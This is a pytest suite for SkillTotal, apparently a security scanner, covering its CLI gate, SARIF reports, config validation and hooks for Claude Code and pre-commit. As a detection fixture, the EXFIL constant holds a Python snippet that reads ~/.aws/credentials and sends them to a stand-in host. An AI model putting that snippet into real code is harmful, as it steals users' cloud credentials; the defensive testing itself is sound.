"""A DevOps engineer adds SkillTotal to a pipeline and to developer machines, as the README says.

Each journey is a defect a customer met (or would have) in a 2026-10 customer-path audit: a gate
that switched itself off, a report that failed a clean build, a hook that gave no reason.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess  # nosec B404 - runs the plugin wrapper and git with fixed arguments
from pathlib import Path

import pytest

from skilltotal import __version__
from tests.journeys.conftest import ROOT, clean_env, git, needs_git, needs_sh

README = (ROOT / "README.md").read_text(encoding="utf-8")


def test_the_installed_cli_is_this_release(skilltotal):
    run = skilltotal("--version")
    assert run.code == 0
    assert __version__ in run.out + run.err


def test_a_pipeline_gate_passes_clean_code_and_fails_risky_code(skilltotal, fixture_copy):
    assert skilltotal("scan", str(fixture_copy("clean_pkg")), "--fail-on-high").code == 0
    risky = skilltotal("scan", str(fixture_copy("malicious_npm_pkg")), "--fail-on-high")
    assert risky.code == 2
    assert "ST-COMBO-EXFIL" in risky.out  # the log says why the build failed


def test_a_sarif_report_goes_to_the_file_and_the_log_stays_readable(skilltotal, fixture_copy,
                                                                     tmp_path):
    sarif = tmp_path / "skilltotal.sarif"
    run = skilltotal("scan", str(fixture_copy("malicious_npm_pkg")), "--sarif", "--output",
                     str(sarif), "--fail-on-high")
    assert run.code == 2
    assert json.loads(sarif.read_text(encoding="utf-8"))["version"] == "2.1.0"
    assert '"$schema"' not in run.out  # the summary, not thousands of lines of SARIF
    assert "Risk" in run.out


def test_scanning_twice_into_the_same_folder_stays_clean(skilltotal, fixture_copy):
    """The report a pipeline writes into the repository must not fail the next scan."""
    repo = fixture_copy("clean_pkg")
    for _ in range(2):
        run = skilltotal("scan", ".", "--sarif", "--output", "skilltotal.sarif", "--fail-on-high",
                         cwd=repo)
        assert run.code == 0, run.out


def _documented_settings() -> list[str]:
    table = README.split("**Settings**", 1)[1].split("\n\n", 2)[1]
    return re.findall(r"^\| `(SKILLTOTAL_[A-Z_]+)` \|", table, flags=re.M)


def test_the_settings_table_is_read(skilltotal):
    assert len(_documented_settings()) >= 7


@pytest.mark.parametrize("name", _documented_settings())
@pytest.mark.parametrize("value", ["lots", "-1", "0"])
def test_every_documented_setting_with_a_bad_value_stops_the_scan(skilltotal, fixture_copy, name,
                                                                  value):
    run = skilltotal("scan", str(fixture_copy("clean_pkg")), **{name: value})
    assert run.code == 1, f"{name}={value} was accepted"
    assert name in run.err


@pytest.mark.parametrize("config", [
    'fail_on = "hihg"\n',
    'fail_onn = "high"\n',
    'fail_on_score = 150\n',
    'exclude = "vendor/*"\n',
    '[policy]\n"ST-SHELL-PIPE-EXEC" = "deny"\n',
    'fail_on = "high\n',
])
def test_a_config_typo_stops_the_scan_instead_of_switching_the_gate_off(skilltotal, fixture_copy,
                                                                        config):
    repo = fixture_copy("malicious_npm_pkg")
    (repo / ".skilltotal.toml").write_text(config, encoding="utf-8")
    run = skilltotal("scan", ".", cwd=repo)
    assert run.code == 1, run.out
    assert "error" in run.err.lower()


def test_every_scan_flag_in_the_readme_exists(skilltotal):
    """A flag the README shows and the CLI rejects is a pipeline that fails on day one."""
    help_text = skilltotal("scan", "--help").out
    shown = set()
    for line in README.splitlines():
        if re.search(r"\bskilltotal scan\b", line):
            shown.update(re.findall(r"(?<![\w-])(--[a-z][a-z-]+)", line))
    assert shown, "no scan command found in the README"
    missing = sorted(flag for flag in shown if flag not in help_text)
    assert not missing, f"README shows flags the CLI does not have: {missing}"


def test_a_missing_repository_says_so(skilltotal):
    if shutil.which("git") is None:
        pytest.skip("needs git")
    run = skilltotal("scan", "https://github.com/pezhik/this-repository-does-not-exist-0000")
    assert run.code == 1
    assert "not found, or it is private" in run.err


# --- The Claude Code plugin on a developer machine and in CI ----------------------------------

def _event(command: str) -> str:
    return json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Bash",
                       "tool_input": {"command": command}, "cwd": str(ROOT)})


def test_in_ci_an_install_from_a_lockfile_is_denied_with_the_way_to_allow_it(skilltotal):
    run = skilltotal("hook", "claude-code", stdin=_event("npm ci"), CI="true")
    answer = json.loads(run.out)
    assert answer["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "SKILLTOTAL_ALLOW_UNCHECKED=lockfile" in answer["systemMessage"]
    allowed = skilltotal("hook", "claude-code", stdin=_event("npm ci"), CI="true",
                         SKILLTOTAL_ALLOW_UNCHECKED="lockfile")
    answer = json.loads(allowed.out)
    assert "permissionDecision" not in answer["hookSpecificOutput"]
    assert "did not check" in answer["systemMessage"]  # allowed, still said


def test_outside_ci_a_lockfile_install_runs_and_is_said(skilltotal):
    answer = json.loads(skilltotal("hook", "claude-code", stdin=_event("npm ci")).out)
    assert "permissionDecision" not in answer["hookSpecificOutput"]
    assert "package-lock.json" in answer["systemMessage"]


def _wrapper(event: str, path: str, **env: str) -> dict:
    done = subprocess.run(  # nosec B603 B607 - the shipped wrapper through sh, fixed arguments
        ["sh", str(ROOT / "plugin" / "hooks" / "pretooluse.sh")], input=event,
        capture_output=True, text=True, env={**clean_env(**env), "PATH": path}, timeout=60,
        check=False)
    assert done.returncode == 0, done.stderr
    return json.loads(done.stdout)


def _path_without_skilltotal() -> str:
    keep = [d for d in os.environ.get("PATH", "").split(os.pathsep)
            if d and not (Path(d) / "skilltotal").exists()
            and not (Path(d) / "skilltotal.exe").exists()]
    return os.pathsep.join(keep)


@needs_sh
def test_on_a_fresh_machine_without_the_cli_on_path_the_plugin_says_how_to_fix_it():
    path = _path_without_skilltotal()
    answer = _wrapper(_event("npm install left-pad"), path)
    assert "not on PATH" in answer["systemMessage"]
    assert "pipx ensurepath" in answer["systemMessage"]
    assert "permissionDecision" not in answer["hookSpecificOutput"]
    denied = _wrapper(_event("npm install left-pad"), path, CI="true")
    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"


# --- pre-commit on a developer machine --------------------------------------------------------

EXFIL = (
    "import os, urllib.request\n"
    "data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
    "urllib.request.urlopen('https://collect.example.invalid', data.encode())\n"
)

needs_pre_commit = pytest.mark.skipif(
    not os.environ.get("SKILLTOTAL_JOURNEY_PRE_COMMIT") or shutil.which("pre-commit") is None,
    reason="installs the hook from this checkout (network); the CI journeys job runs it")


@needs_git
@needs_pre_commit
def test_pre_commit_blocks_a_staged_threat_and_ignores_an_untracked_file(tmp_path):
    repo = tmp_path / "service"
    repo.mkdir()
    git(repo, "init", "-q")
    git(repo, "config", "user.email", "dev@example.invalid")
    git(repo, "config", "user.name", "dev")
    (repo / "app.py").write_text("print('ok')\n", encoding="utf-8")
    (repo / "scratch.py").write_text(EXFIL, encoding="utf-8")  # never added
    head = subprocess.run(  # nosec B603 B607 - git with fixed arguments
        ["git", "-C", str(ROOT), "rev-parse", "HEAD"], capture_output=True, text=True,
        check=True).stdout.strip()
    # The README's config, with this checkout as the hook's repository.
    (repo / ".pre-commit-config.yaml").write_text(
        f"repos:\n  - repo: {ROOT.as_posix()}\n    rev: {head}\n    hooks:\n"
        "      - id: skilltotal\n        args: [\".\", \"--fail-on-high\"]\n",
        encoding="utf-8")
    git(repo, "add", "app.py", ".pre-commit-config.yaml")

    def hook() -> subprocess.CompletedProcess:
        return subprocess.run(  # nosec B603 B607 - pre-commit with fixed arguments
            ["pre-commit", "run"], cwd=repo, capture_output=True, text=True,
            env=clean_env(), timeout=900, check=False)

    first = hook()
    assert first.returncode == 0, first.stdout + first.stderr
    (repo / "upload.py").write_text(EXFIL, encoding="utf-8")
    git(repo, "add", "upload.py")
    second = hook()
    assert second.returncode != 0
    assert "ST-COMBO-EXFIL" in second.stdout
